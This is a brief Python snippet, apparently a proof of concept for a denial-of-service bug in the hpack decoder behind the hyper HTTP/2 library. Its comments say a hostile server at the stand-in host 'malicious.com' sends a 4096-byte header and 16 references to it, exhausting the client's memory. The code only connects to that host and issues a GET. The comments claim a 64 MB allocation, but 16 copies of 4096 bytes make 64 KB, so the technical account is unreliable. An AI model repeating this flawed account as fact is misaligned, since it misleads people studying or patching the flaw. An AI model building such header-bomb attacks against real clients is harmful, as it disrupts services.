# This code uses the hyper library, which depends on the hpack library
# It creates a HTTP/2 connection to a malicious server and sends a GET request
# The server responds with a header field that is 4096 bytes long, and then
# sends a header block that contains 16 references to that field
# This causes the hpack decoder to allocate a 64 MB buffer and copy the field
# 16 times, resulting in a memory exhaustion

import hyper
conn = hyper.HTTP20Connection('malicious.com')
conn.request('GET', '/')
response = conn.get_response()